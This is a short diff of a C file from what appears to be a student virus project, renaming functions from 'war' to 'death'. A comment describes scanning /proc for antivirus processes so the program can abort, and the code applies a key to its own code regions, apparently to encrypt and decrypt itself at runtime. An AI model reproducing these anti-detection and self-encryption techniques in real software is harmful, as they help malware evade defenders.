@@ -6,16 +6,16 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/27 12:20:54 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/12 20:44:18 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/22 21:02:11 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include "war.h"
+#include "death.h"
 
 /*
   Opening() iterate thought every entry in /proc in order to found antivirus proccess
   Look at needle variable to remove or add proccess you want to find.
-  if the process is found then War abort as soon as possible.
+  if the process is found then Death abort as soon as possible.
   i'm deeply sorry about how ugly opening() is :(
 */
 __INLINE__ static bool read_entry(int fd)
@@ -93,7 +93,7 @@ next:
 	_close(fd[1]);
 	_close(fd[2]);
 
-	update_one(&data->key, (char*)opening, (size_t)war - (size_t)opening);
-	revert_one(&data->key, (char*)war, (size_t)locate - (size_t)war);
-	war(data);
+	update_one(&data->key, (char*)opening, (size_t)death - (size_t)opening);
+	revert_one(&data->key, (char*)death, (size_t)locate - (size_t)death);
+	death(data);
 }
